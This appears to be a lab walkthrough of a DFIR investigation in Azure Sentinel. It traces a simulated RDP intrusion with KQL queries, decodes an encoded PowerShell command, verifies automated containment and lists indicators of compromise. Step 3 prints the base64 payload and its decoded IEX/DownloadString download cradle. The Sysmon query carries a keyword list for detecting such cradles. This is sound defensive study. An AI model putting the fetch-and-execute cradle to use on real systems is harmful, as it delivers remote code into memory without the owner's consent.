# Scenario 3 — DFIR Investigation Walkthrough

## Purpose

This document is a separate, deliberately manual investigative exercise performed against the Scenario 3 incident — the goal is to demonstrate the ability to reconstruct an attack timeline and extract indicators of compromise directly from raw telemetry, as a SOC analyst would when handed an incident rather than when building the detection that generated it. Each step below uses a distinct data source, chosen specifically to piece together the full picture from independent evidence rather than relying on a single query.

## Step 1 — Validate Initial Access

**Goal:** establish how and when the attacker first reached the VM, before any process execution occurred.

**Note on data source:** the original intent was to use Windows Security Event Log data (`SecurityEvent`, EventID 4624, Logon Type 10/RemoteInteractive) for this step. During this investigation, `SecurityEvent` was found to contain no data at all in this environment. Direct inspection of the Data Collection Rule confirmed it was scoped only to the `Microsoft-Windows-Sysmon/Operational` event channel — Windows Security Event log collection was never configured in this rebuilt environment. This is documented as a genuine environment gap, not treated as a blocker; see `docs/securityevent-dcr-gap.md`. Rather than spend investigation time rebuilding this data source retroactively, the equivalent evidence was sourced from Scenario C's Entra ID sign-in telemetry, which independently captures the same successful RDP-triggering authentication event.

```kusto
SigninLogs
| where UserPrincipalName has "sjones"
| where ResultType == "0"
| where AppId == "38aa3b87-a06d-4817-b275-7a316988d93b"
| where TimeGenerated > ago(24h)
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName
```

**Finding:** initial infrastructure access was established via a successful RDP-triggering sign-in for `sjones`, confirmed in Entra ID Sign-in Logs, at the timestamp captured in the Scenario C artifact set. This establishes the starting point of the on-host portion of the attack timeline.

## Step 2 — Isolate Payload Execution

**Goal:** identify what the attacker actually did once access was established.

```kusto
Event
| where TimeGenerated > ago(24h)
| where Source == "Microsoft-Windows-Sysmon"
| where EventID == 1
| where EventData has "powershell.exe"
| where EventData contains "-enc" or EventData has_any ("FromBase64String", "DownloadString", "IEX")
| extend ActualUser = extract(@'<Data Name="User">([^<]+)</Data>', 1, EventData)
| extend CommandLine = extract(@'<Data Name="CommandLine">([^<]+)</Data>', 1, EventData)
| project TimeGenerated, Computer, ActualUser, CommandLine
```

**Note on query correction:** an initial version of this step, drafted before this walkthrough, used a regex extraction pattern (`extract(@"CommandLine:(.*?)<", ...)`) that did not correctly match the actual structure of the Sysmon event payload, and would have silently returned empty results. The corrected pattern above matches the same `<Data Name="X">...</Data>` XML structure already validated and used consistently throughout this project's other detection queries.

**Finding:** at the timestamp shown in the result, `sjones` executed `powershell.exe -enc <base64 blob>`. The full command line, captured directly from the raw event payload, documents the exact string used, including the encoding flag — evidence the attacker attempted to obscure the command's true content from casual log review.

## Step 3 — Decode the Payload

**Goal:** determine what the encoded command was actually designed to do, since an analyst cannot close an incident on the basis of "it was encoded" alone.

**Encoded string:**
```
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAuAC4ALgAnACkA
```

PowerShell's `-EncodedCommand`/`-enc` parameter expects UTF-16LE-encoded, base64-wrapped text. Decoding accordingly yields:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com...')
```

**Analysis:** this is a download cradle. `Net.WebClient.DownloadString` retrieves the contents of a remote URL as a string, and `Invoke-Expression` (`IEX`) immediately executes that returned string as PowerShell code — meaning the actual second-stage payload is never written to disk, only ever held in memory. This is a real, commonly observed technique (not a synthetic example invented for this lab) and maps to MITRE ATT&CK **T1059.001** (Command and Scripting Interpreter: PowerShell) and **T1105** (Ingress Tool Transfer). The referenced URL in this test was intentionally incomplete/non-functional, since the goal of this exercise was to validate detection of the execution pattern itself, not to actually retrieve or execute a real second-stage payload.

## Step 4 — Verify Containment

**Goal:** confirm the automated response actually took effect at the infrastructure layer, not just that the Logic App reported success.

An initial attempt to verify this via the Azure Activity Log:
```kusto
AzureActivity
| where TimeGenerated > ago(24h)
| where OperationNameValue == "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE"
| where ActivityStatusValue == "Accept"
| project TimeGenerated, Caller, OperationNameValue, ResourceGroup, Resource
```
returned no results. Rather than spend further investigation time on a possible operation-name mismatch or ingestion delay in this secondary log source, containment was instead verified using stronger, already-available first-party evidence:

- The Logic App's own run history, showing all three containment actions (NSG allow rule, NSG deny-all rule, forced session logoff via Run Command) as successfully completed
- Direct behavioral confirmation: the attacker's active RDP session was observed to disconnect immediately following the Logic App run, a subsequent connection attempt from a non-whitelisted IP failed, and a connection attempt from the analyst's whitelisted home IP succeeded

**Finding:** containment was confirmed both by the automation's own execution record and by direct behavioral testing of the resulting network state — arguably stronger evidence than a secondary activity log entry alone would have provided.

## Consolidated Timeline

| Time | Event | Source |
|---|---|---|
| T+0 | Successful RDP-triggering sign-in for `sjones` | Entra ID SigninLogs |
| T+shortly after | `sjones` executes encoded PowerShell download cradle | Sysmon EventID 1 |
| T+up to 5min | Detection rule fires, incident created | Sentinel |
| T+5min | Three-part containment executes (NSG allow, NSG deny, forced logoff) | Logic App run history |
| Immediately after | Active session confirmed dropped; reconnection blocked except from whitelisted IP | Direct observation |

## Indicators of Compromise

- Attacker-originating IP (Scenario 1 spray source)
- Compromised account: `sjones`
- Process: `powershell.exe`, invoked with `-enc` flag
- Full base64 payload string (documented above)
- Decoded technique: `Net.WebClient.DownloadString` + `IEX` download cradle
- ProcessGuid of the executing PowerShell process (for cross-referencing against any further related events)
